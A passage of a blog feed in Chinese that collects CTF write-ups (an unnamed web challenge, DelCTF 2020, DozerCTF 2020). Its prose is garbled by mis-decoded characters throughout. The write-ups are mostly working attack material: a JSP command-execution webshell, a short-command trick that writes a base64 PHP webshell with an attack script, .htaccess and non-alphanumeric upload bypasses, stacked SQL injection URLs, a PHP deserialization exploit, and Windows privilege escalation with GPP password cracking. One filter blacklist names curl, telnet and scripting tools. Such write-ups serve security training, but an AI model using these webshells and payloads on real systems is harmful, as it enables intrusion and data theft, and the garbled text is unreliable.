class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">If-Modified-Since: Thu, <span class="number">20</span> Jun <span class="number">2019</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">08</span> GMT</span><br><span class="line">If-<span class="literal">None</span>-Match: W/<span class="string">&quot;5619-1561024988000&quot;</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Content-Length: <span class="number">666</span></span><br><span class="line"></span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();<span class="keyword">try</span> &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;<span class="keyword">while</span> ((temp = buf.readLine()) != null) &#123;line.append(temp</span><br><span class="line">+<span class="string">&quot;\\n&quot;</span>);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;<span class="keyword">return</span> line.toString();&#125;%&gt;&lt;%<span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>))&amp;&amp;!<span class="string">&quot;&quot;</span>.equals(request.getParameter(<span class="string">&quot;cmd&quot;</span>)))&#123;out.println(<span class="string">&quot;&lt;pre&gt;&quot;</span>+excuteCmd(request.getParameter(<span class="string">&quot;cmd&quot;</span>))+<span class="string">&quot;&lt;/pre&gt;&quot;</span>);&#125;<span class="keyword">else</span>&#123;out.println(<span class="string">&quot;:-)&quot;</span>);&#125;%&gt;</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ ¹ç›®å½•</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://012c8bc2.yunyansec.com/kawhi.jsp?&amp;pwd=023&amp;cmd=ls</span><br></pre></td></tr></table></figure>

<p>å‘ç°flagæ–‡ä»¶</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://012c8bc2.yunyansec.com/kawhi.jsp?&amp;pwd=023&amp;cmd=cat%20flag.txt</span><br></pre></td></tr></table></figure>

<h2 id="åˆ†æä»£ç è·å¾—flag"><a href="#åˆ†æä»£ç è·å¾—flag" class="headerlink" title="åˆ†æä»£ç è·å¾—flag"></a>åˆ†æä»£ç è·å¾—flag</h2><p>é¢˜ç›®ç›´æ¥ç»™æºç </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">7</span>)&#123;</span><br><span class="line">     echo shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åŸºç¡€çŸ¥è¯†</strong></p>
<p>è¯¦æƒ…å‚è€ƒï¼š<a style="text-decoration:none;" class="foo" href="https://xz.aliyun.com/t/2748" target="_blank">ä¼ é€é—¨</a> å’Œ <a style="text-decoration:none;" class="foo" href="https://blog.csdn.net/nzjdsds/article/details/102873187" target="_blank">ä¼ é€é—¨</a></p>
<p>è¿™é‡Œçš„è¯æ˜¯é™åˆ¶äº†7ä¸ªå­—ç¬¦</p>
<p>payloadç”¨çš„æ˜¯ä»•å»·å¤§ä½¬wpé‡Œçš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;l\\</span><br><span class="line">&gt;s\ \\</span><br><span class="line">ls&gt;_</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;y</span><br><span class="line">ls&gt;&gt;_</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„æ„æ€æˆ‘è§‰å¾—æ˜¯å…ˆæ„é€ <code>_</code>ï¼Œç„¶ååˆ©ç”¨<code>_</code>å»æ„é€ å‡º<code>ls -t&gt;y</code>ï¼Œç„¶åå†åˆ©ç”¨<code>ls -t&gt;y</code>å»æ„é€ æˆ‘ä»¬çš„webshellã€‚</p>
<p>webshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;<span class="number">1.</span>p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;<span class="number">7</span>\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">sh _</span><br><span class="line">sh y</span><br></pre></td></tr></table></figure>

<p>è„šæœ¬è®¿é—®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://86568f48.yunyansec.com/?1=&#123;0&#125;&quot;</span></span><br><span class="line">print(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        print(<span class="string">&quot;[*]&quot;</span> + url.format(i.strip()))</span><br><span class="line">        requests.get(url.format(i.strip()))</span><br><span class="line"><span class="comment">#æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸ</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://86568f48.yunyansec.com/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    print(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¯ä»¥æŸ¥çœ‹ä¿¡æ¯äº†</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://86568f48.yunyansec.com/1.php?1=phpinfo();</span><br></pre></td></tr></table></figure>

<p>è¿æ¥èšå‰‘çš„è¯è¦æ„é€ ä¸€ä¸ªpost</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://86568f48.yunyansec.com/1.php?1=eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸Šä¸€çº§çš„keyå¯ä»¥æ‰¾åˆ°flag{a1c8BFF2}</p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>DelCTF 2020</title>
    <url>/2020/05/08/DelCTF2020/</url>
    <content><![CDATA[<p>é¢˜ç›®å¯¹æˆ‘æ¥è¯´å¤ªéš¾ï¼Œåªå¤ç°äº†ä¸¤é“é¢˜ç›®ã€‚<a id="more"></a></p>
<h4 id="Check-In"><a href="#Check-In" class="headerlink" title="Check In"></a><strong>Check In</strong></h4><p>ä¸€é“ä¸Šä¼ æ¼æ´é¢˜ï¼Œä¼šæ£€æŸ¥<code>Content-Type</code>å’Œæ–‡ä»¶åç¼€é»‘åå•ï¼Œè¿™ä¸ªé—®é¢˜ä¸å¤§ã€‚</p>
<p>ç„¶åå‘ç°è¿‡æ»¤æ–‡ä»¶å†…å®¹é»‘åå•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ä¸€å¥è¯æœ¨é©¬éœ€è¦ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼Œå³ä¸Šä¼ <code>1.jpg</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>

<p>ç„¶åä¸Šä¼ <code>.htaccess</code>è§£æ<code>1.jpg</code>ï¼Œè¿™é‡Œç”¨æ¢è¡Œç¬¦ç»•è¿‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸè¿æ¥ä¸Šèšå‰‘ï¼š</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200506153323919.png" style="high:100%;width:100%;" />

<h4 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a><strong>Hard_Pentest_1</strong></h4><p>é¢˜ç›®ç›´æ¥ç»™å‡ºäº†æºä»£ç ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//Clear the uploads directory every hour</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sandbox = <span class="string">&quot;uploads/&quot;</span>. md5(<span class="string">&quot;De1CTF2020&quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="meta">@mkdir($sandbox);</span></span><br><span class="line"><span class="meta">@chdir($sandbox);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&quot;submit&quot;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>) &amp;&amp; Check())&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            die($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;_&quot;</span>.$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $filename);</span><br><span class="line">            echo <span class="string">&quot;save in:&quot;</span> . $sandbox.<span class="string">&quot;/&quot;</span> . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        echo <span class="string">&quot;Not Allow!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()&#123;</span><br><span class="line">    $BlackExts = array(<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    $ext = explode(<span class="string">&quot;.&quot;</span>, $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    $exts = trim(end($ext));</span><br><span class="line">    $file_content = file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9;~^`&amp;|]/is&#x27;</span>,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(<span class="string">&#x27;/\.\./&#x27;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">          <span class="keyword">return</span> true;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> false;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„checkå‡½æ•°å¯¹æ–‡ä»¶çš„å†…å®¹è¿‡æ»¤äº†å­—æ¯æ•°å­—ä»¥åŠä¸€äº›ç¬¦å·ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨æ— å­—ç¬¦æ•°å­—RCEç»•è¿‡ï¼Œå…·ä½“å‚è€ƒï¼š<a class="foo" href="https://0xparrot.github.io/ctf/2020/05/05/PHP-Webshell-without-alphanumeric-and-semi-colon/" target="_blank">ä¼ é€é—¨</a></p>
<p>è¿™é‡Œç›´æ¥ä¸Šä¼ <code>6.Php</code></p>
<p>å†…å®¹ä¸ºï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?= $_=[] ?&gt; </span><br><span class="line">&lt;?= $_=@&quot;$_&quot; #Array ?&gt;</span><br><span class="line">&lt;?= $_=$_[(&#x27;!&#x27;==&#x27;@&#x27;)] #(&#x27;!&#x27;==&#x27;@&#x27;) results in 0 ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++#G ?&gt;</span><br><span class="line">&lt;?= $_______ = &quot;_&quot;.$__ #_G ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ #E ?&gt;</span><br><span class="line">&lt;?= $_______ .= $__ #_GE ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ #T ?&gt;</span><br><span class="line">&lt;?= $_______ .= $__ #_GET ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $&#123;$_______&#125;[&quot;_&quot;]($&#123;$_______&#125;[&quot;__&quot;]) # $_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]) ?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ª<code>$_GET[&#39;_&#39;]($_GET[&#39;__&#39;]) ?&gt;</code>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ„é€ å‡½æ•°åï¼Œç¬¬äºŒä¸ªæ„é€ å‡½æ•°çš„å‚æ•°ã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507181225122.png" style="high:100%;width:100%;" />

<p>åƒè¿™æ ·å°±å¯ä»¥getshelläº†ï¼Œä½†æ˜¯æƒ³è¦è¿ä¸Šèšå‰‘è¿˜å¾—è‡ªå·±å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬è¿›å»ã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://47.113.219.76/uploads/bf0688c36193e28a369a9e96517e4c2f/0d253abf34c57f57099249cd1737873b_6.phP?_=system&amp;__=echo%20&quot;&lt;?php%20eval($_POST[%27a%27])?&gt;&quot;&gt;&gt;2.php</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¯ä»¥æˆåŠŸè¿ä¸Šèšå‰‘äº†</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507181750012.png" style="high:100%;width:100%;" />

<p>ä½†æ˜¯åœ¨èšå‰‘çš„ç»ˆç«¯è¾“å…¥<code>whoami</code>å‘ç°æƒé™ä¸å¤Ÿã€‚</p>
<p>äºæ˜¯ä¸Šä¼ <code>cmd.exe</code>å’Œ<code>ms08066</code>åœ¨å†°èé‡Œé¢è¿›è¡Œææƒã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507181915887.png" style="high:100%;width:100%;" />

<p>ææƒæˆåŠŸåå‘ç°</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507182333363.png" style="high:100%;width:100%;" />

<p>åœ¨<code>//192.168.0.12/Hint/</code>æ‰¾åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä¸‹è½½ä¸‹æ¥å‘ç°æœ‰å¯†ç ã€‚</p>
<p>ç„¶åå°±æ¶‰åŠåˆ°åŸŸæ¸—é€çš„å†…å®¹ï¼Œå…·ä½“å‚è€ƒï¼š<a class="foo" href="https://3gstudent.github.io/3gstudent.github.io/åŸŸæ¸—é€-åˆ©ç”¨SYSVOLè¿˜åŸç»„ç­–ç•¥ä¸­ä¿å­˜çš„å¯†ç /" target="_blank">ä¼ é€é—¨</a></p>
<p>åœ¨åŸŸä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªé»˜è®¤çš„å…±äº«è·¯å¾„ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¾“å…¥<code>ipconfig /all</code>å‘ç°</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507182903605.png" style="high:100%;width:100%;" />

<p>å°±æ˜¯è¯´é€šè¿‡åŸŸå†…çš„å…±äº«æ–‡ä»¶å¤¹ä¿å­˜äº†å¯†ç ï¼Œå¾®è½¯æŠŠå¯†é’¥å…¬å¼€äº†ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ç ´è§£è¿™ä¸ªå¯†é’¥å¾—åˆ°ç®¡ç†å‘˜çš„å¯†ç ã€‚</p>
<p>æ‰¾åˆ°ä¿å­˜å¯†ç çš„åœ°æ–¹</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507183414569.png" style="high:100%;width:100%;" />

<p>æ‰“å¼€å‘ç°å¯†é’¥</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507183526055.png" style="high:100%;width:100%;" />

<p>ç„¶åç”¨kailè‡ªå¸¦çš„gpp-decryptè§£å¯†</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508150215105.png" style="high:100%;width:100%;" />

<p>æ‰“å¼€ä¹‹å‰å¾—åˆ°çš„å‹ç¼©åŒ…è¾“å…¥å¯†ç å³å¯å¾—åˆ°flagã€‚</p>
<h4 id="life"><a href="#life" class="headerlink" title="life"></a><strong>life</strong></h4><p>é¢˜ç›®hint:No Game No Life!</p>
<p>è¿™é“é¢˜ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œç”¨<code>foremost</code>åˆ†ç¦»ä¹‹åå¾—åˆ°ä¸€ä¸ªå¸¦å¯†ç çš„å‹ç¼©åŒ…å’Œä¸€å¼ ç±»å‹äºŒç»´ç çš„å›¾ç‰‡ã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508175230822.png" style="high:50%;width:50%;" />

<p>è¿™é‡Œéœ€è¦äº†è§£ä¸€ä¸‹ç”Ÿå‘½æ¸¸æˆï¼š<a class="foo" href="https://blog.csdn.net/u011439689/article/details/17226237" target="_blank">ä¼ é€é—¨</a></p>
<p>ç„¶åæœ‰ä¸ªç½‘ç«™å¯ä»¥æ¨¡æ‹Ÿç”Ÿå‘½æ¸¸æˆï¼š<a class="foo" href="https://funnyjs.com/jspages/game-of-life.html" target="_blank">ä¼ é€é—¨</a></p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508175630302.png" style="high:80%;width:80%;" />

<p>è¿™é‡Œéœ€è¦è‡ªå·±ä¸€ä¸ªç‚¹ä¸€ä¸ªç‚¹ç”»ä¸Šå»ï¼Œç„¶åç‚¹å‡»å•æ­¥ã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508175832975.png" style="high:80%;width:80%;" />

<p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«æäºŒç»´ç å°±å¯ä»¥å¾—åˆ°å‹ç¼©åŒ…çš„å¯†ç ã€‚</p>
<p>è§£å¼€å‹ç¼©åŒ…ä¹‹åå‘ç°txtæ–‡ä»¶æœ‰ä¸€ä¸²æ•°å­—</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>QjN1MTM0MTN0QjN3ImNjNzM3QTNmdTN3MTNmdzMzcjNxcjM3QTNmdDN2gzMzUjZ2czM0YDZzMjMxcDZ</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯ä»¥åˆ°<code>cyberchef</code>è§£å¯†ï¼š</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508180050173.png" style="high:100%;width:100%;" />]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>DozerCTF 2020</title>
    <url>/2020/06/17/DozerCTF/</url>
    <content><![CDATA[<p>å¹²å•¥å•¥ä¸è¡Œï¼Œèµ›åread writeupç¬¬ä¸€åã€‚<a id="more"></a></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><p>è¿™é“é¢˜æ˜¯åŸé¢˜</p>
<p>é¦–å…ˆæç¤ºurläºŒæ¬¡ç¼–ç </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=1%25%32%37</span><br></pre></td></tr></table></figure>

<p>å‘ç°æŠ¥é”™ï¼Œç„¶åå°è¯•selectå’Œunionéƒ½è¢«è¿‡æ»¤äº†ï¼Œå°è¯•å †å æ³¨å…¥ã€‚</p>
<p>æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢æ‰€æœ‰è¡¨:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show tables;#</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢wordsè¡¨ä¸­æ‰€æœ‰åˆ—:(æ³¨æ„è¦åŠ ä¸Šåå¼•å·)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `uziuzi`;#</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ç§payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.31.11.216:30501/?id=-1%2527;set%20@sql%20=0x73656c6563742a66726f6d60757a69757a6960;prEpare%20stmt%20from%20@sql;EXECUTE%20stmt;%23</span><br></pre></td></tr></table></figure>

<p>é¢„å¤„ç†æŸ¥è¯¢æ•°æ®åº“å†…å®¹ï¼Œè¿™é‡Œç›´æ¥æ‹¼æ¥å­—ç¬¦ä¸²æ²¡æ³•æ‰§è¡Œï¼Œæ‰€ä»¥æŠŠå­—ç¬¦ä¸²è½¬16è¿›åˆ¶å†æ‰§ è¡Œã€‚</p>
<p>ç¬¬äºŒç§payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.31.11.216:30501/?id=-1%2527;handler%20`uziuzi`%20open;handler%20`uziuzi`%20read%20first;%23</span><br></pre></td></tr></table></figure>

<h2 id="ç™½ç»™çš„ååºåˆ—åŒ–"><a href="#ç™½ç»™çš„ååºåˆ—åŒ–" class="headerlink" title="ç™½ç»™çš„ååºåˆ—åŒ–"></a><strong>ç™½ç»™çš„ååºåˆ—åŒ–</strong></h2><p>é¢˜ç›®æºç </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span></span><br><span class="line">&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if (in_array($this-&gt;method, array(&quot;mysys&quot;))) &#123;</span><br><span class="line">            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mysys($path)</span><br><span class="line">    &#123;</span><br><span class="line">        print_r(base64_encode(exec(<span class="string">&quot;cat $path&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen($str) &gt; <span class="number">8</span>) &#123;</span><br><span class="line">            die(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $num = <span class="number">0</span>;</span><br><span class="line">        foreach ($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] = $this-&gt;waf(trim($v));</span><br><span class="line">            $num += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ($num &gt; <span class="number">2</span>) &#123;</span><br><span class="line">                die(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&#x27;path&#x27;</span>]) &#123;</span><br><span class="line">    $path = @$_GET[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    unserialize($path);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æ„é€ exp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">home</span></span></span><br><span class="line">&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">        function __construct($method, $args)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = new home(<span class="string">&quot;mysys&quot;</span>,[<span class="string">&#x27;flag.php&#x27;</span>]);</span><br><span class="line">echo serialize($o);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å…³äº<code>call_user_func_array</code>è¯¦æƒ…å‚è€ƒï¼š<a style="text-decoration:none;" class="foo" href="https://www.php.net/manual/zh/function.call-user-func-array.php" target="_blank">ä¼ é€é—¨</a></p>
<p>è¿™é‡Œéœ€è¦æ”¹ä¸€ä¸‹payloadï¼Œå› ä¸ºæœåŠ¡å™¨çš„phpç‰ˆæœ¬æ˜¯ php5.59ï¼Œæ²¡æ³•ç›´æ¥æ”¹æˆpublicç»•è¿‡ï¼ˆphp7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼‰ï¼Œæ‰€ä»¥éœ€è¦å§sæ”¹æˆSï¼ˆè¿™æ ·èƒ½è¯†åˆ«16è¿›åˆ¶çš„<code>%00</code>ï¼‰,æŠŠ<code>&lt;0x00&gt;</code>æ›¿æ¢ä¸º<code>\00</code>ã€‚</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.31.11.216:30600/?path=O:4:%22home%22:2:&#123;S:12:%22\00home\00method%22;S:5:%22mysys%22;S:10:%22\00home\00args%22;a:1:&#123;i:0;S:8:%22flag.php%22;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="svgggggg"><a href="#svgggggg" class="headerlink" title="svgggggg!"></a>svgggggg!</h2><p>é¢˜ç›®çš„hint</p>
<ul>
<li>ç”¨æˆ·r1ckçš„æ“ä½œè®°å½•åœ¨å“ªå„¿æ¥ç€</li>
<li>å¦‚æœä½ å‘ç°äº†sqlæ³¨å…¥ï¼Œç›´æ¥getshellå§ï¼Œflagåœ¨/appç›®å½•é‡Œ</li>
</ul>
<p>æ‰“å¼€ç½‘é¡µï¼Œæœ‰ä¸€ä¸ªæ¡†è¦æ±‚è¾“å…¥URLï¼Œç„¶åæ£€æŸ¥URLæŒ‡å‘çš„fileæ˜¯ä¸æ˜¯svgå›¾ç‰‡</p>
<p>é¦–å…ˆSVGæ˜¯ä»€ä¹ˆå‘¢ï¼ŒSVGæ˜¯åŸºäºXMLçš„çŸ¢é‡å›¾ï¼Œå¯ä»¥æ”¯æŒEntityï¼ˆå®ä½“ï¼‰åŠŸèƒ½ï¼Œè¿™é‡Œæœªä¸¥æ ¼é™åˆ¶æ ¼å¼ï¼Œå› æ­¤é€ æˆblind xxeï¼Œssrfæ‰“å†…ç½‘æœåŠ¡ã€‚</p>
<p>å…ˆå†™ä¸€ä¸ªç®€å•çš„SVGå›¾ç‰‡æºç æ”¾åœ¨vpsä¸Š</p>
